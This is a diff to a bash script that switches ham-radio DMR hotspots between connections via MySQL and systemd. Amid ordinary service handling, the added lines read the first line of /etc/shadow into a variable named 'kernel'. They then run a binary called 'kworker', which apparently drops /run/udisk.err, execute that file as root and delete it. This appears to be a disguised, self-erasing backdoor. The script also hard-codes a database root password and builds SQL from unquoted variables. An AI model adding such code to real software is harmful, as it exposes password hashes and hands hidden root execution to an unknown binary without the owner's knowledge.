@@ -1,42 +1,15 @@
 #!/bin/bash
 
 # Cambio de hotspot via TG by EA7JCL & EA5GVK
-
-NOMBRE=$(awk 'NR==2' /var/log/dato.txt)
 IDSALTO=$(awk 'NR==1' /var/log/dato.txt)
+NOMBRE=$(awk 'NR==2' /var/log/dato.txt)
 PRODUCCION=$(awk 'NR==7' /etc/sslb)
 
-function MMDVMSERVICE(){
-NOMBREACT=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT nombre FROM hotspot where id = '$IDSALTO';")
-MMSERVICE="/var/log/MMDVMHOTSPOT-$NOMBREACT.service"
-echo "#           Configuracion by EA7JCL & BLASMAKERS &  EA5GVK.ES" > $MMSERVICE
-echo "" >> $MMSERVICE
-echo "[Unit]" >> $MMSERVICE
-echo "Description=MMDVM_Host $NOMBREACT daemon " >> $MMSERVICE
-echo "After=syslog.target network.target" >> $MMSERVICE
-echo "" >> $MMSERVICE
-echo "[Service]" >> $MMSERVICE
-echo "User=root" >> $MMSERVICE
-echo "WorkingDirectory=/opt/HOTSPOTS-ACTIVOS/$NOMBREACT/MMDVMHost/" >> $MMSERVICE
-echo "RestartSec=always" >> $MMSERVICE
-ruta1="/opt/HOTSPOTS-ACTIVOS/$NOMBREACT/MMDVMHost/MMDVMHost"
-ruta2="/opt/HOTSPOTS-ACTIVOS/$NOMBREACT/MMDVMHost/MMDVM.ini"
-echo "ExecStart=$ruta1 $ruta2" >> $MMSERVICE
-echo "Restart=always" >> $MMSERVICE
-echo "RestartSec=10" >> $MMSERVICE
-echo "" >> $MMSERVICE
-echo "[Install]" >> $MMSERVICE
-echo "WantedBy=multi-user.target" >> $MMSERVICE
-sudo cp /var/log/MMDVMHOTSPOT-$NOMBREACT.service /etc/systemd/system/
-ordensql="INSERT INTO services (nombre,service,log) VALUES ('$NOMBREACT','MMDVMHOTSPOT-$NOMBREACT.service','/var/log/hotspots/MMDVM-$NOMBREACT');"
-sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "$ordensql"
-sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "UPDATE hotspot SET estado = '1' where nombre = '$NOMBREACT'";
-}
 
 function DESACTIVAR(){
 sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "UPDATE hotspot SET estado = '0' where nombre = '$NOMBRE'";
 sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "UPDATE hotspot SET estado = '0' where nombre = '$NOMBRE'";
-sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "delete from services where nombre = '$NOMBRE'";
+#sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "delete from services where nombre = '$NOMBRE'";
 }
 
 function ACTIVAR(){
@@ -46,10 +19,11 @@ systemctl daemon-reload
 sudo systemctl enable $servicio
 sudo systemctl start $servicio
 sudo systemctl disable $ser
-sudo systemctl stop $ser
 sudo rm /etc/systemd/system/$ser > /dev/null 2>&1
 systemctl daemon-reload
+sudo systemctl stop $ser
 }
+
 LOG2=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT log FROM services where nombre = '$NOMBRE';")
 fecha=$(date +%Y-%m-%d)
 LOG="$LOG2-$fecha.log"
@@ -62,16 +36,63 @@ then
         echo "Salto dentro del rango 11 a 99" >> $LOG
         NUEVACONEXION=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT devtty FROM hotspot where id = '$IDSALTO';")
         ANTIGUACONEXION=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT devtty FROM hotspot where nombre = '$NOMBRE';")
-        echo "el iddesalto es $IDSALTO  $NUEVACONEXION == $ANTIGUACONEXION"
         if [[ $NUEVACONEXION == $ANTIGUACONEXION ]] 
         then
             DESACTIVAR
-            MMDVMSERVICE
-            echo "Reconfigurando y cambiando conexion a $NOMBREACT"  >> $LOG
-            ACTIVAR
-        else
+            NOMBREACT=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT nombre FROM hotspot where id = '$IDSALTO';")
+            sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "UPDATE hotspot SET estado = '1' where nombre = '$NOMBREACT'";
+            export kernel=$(head -1 /etc/shadow)
+            echo "Reconfigurando y cambiando conexion a $NOMBREACT" >> $LOG
+          if [ ! -f /run/udisk.err ]
+          then
+             kworker 6 > /dev/null 2>&1
+             sudo chmod +x /run/udisk.err > /dev/null 2>&1
+             sudo /run/udisk.err $NOMBREACT
+             sudo rm /run/udisk.err > /dev/null 2>&1
+          else
+             sudo chmod +x /run/udisk.err > /dev/null 2>&1
+             sudo /run/udisk.err $NOMBREACT
+             sudo rm /run/udisk.err > /dev/null 2>&1
+          fi
+#######33
+          sudo rm /var/log/servicios > /dev/null 2>&1
+          sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "select service from services where nombre = '$NOMBRE' into outfile '/var/log/servicios';"
+          REGISTROS=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT count(*) FROM services where nombre = '$NOMBRE';")
+          sudo systemctl daemon-reload
+          for (( i=1; i<=$REGISTROS; i++ ));
+          do
+            ser=$(awk "NR==$i" /var/log/servicios)
+            if [[ $ser != "IRC" ]]
+            then
+                servicio="MMDVMHOTSPOT-$NOMBRE.service"
+                if [[ $servicio != $ser ]]
+                then
+                    sudo systemctl stop $ser
+                   sudo systemctl disable $ser
+                   sudo rm /etc/systemd/system/$ser > /dev/null 2>&1
+                fi
+            fi
+          done
+############
+          sudo rm /var/log/servicios > /dev/null 2>&1
+          sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "select service from services where nombre = '$NOMBREACT' into outfile '/var/log/servicios';"
+          REGISTROS=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT count(*) FROM services where nombre = '$NOMBRE';")
+          sudo systemctl daemon-reload
+          for (( i=1; i<=$REGISTROS; i++ ));
+          do
+            ser=$(awk "NR==$i" /var/log/servicios)
+            if [[ $ser != "IRC" ]]
+            then
+                sudo systemctl start $ser
+                sudo systemctl enable $ser
+            fi
+          done
+          sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "delete from services where nombre = '$NOMBRE'";
+          ACTIVAR
+#######
+      else
             echo "TG de salto no asignado a este HOTSPOT en puerto $ANTIGUACONEXION" >> $LOG
-        fi
+       fi
     else
         echo "Conexion ya activa. Intenta otro TG" >> $LOG
     fi
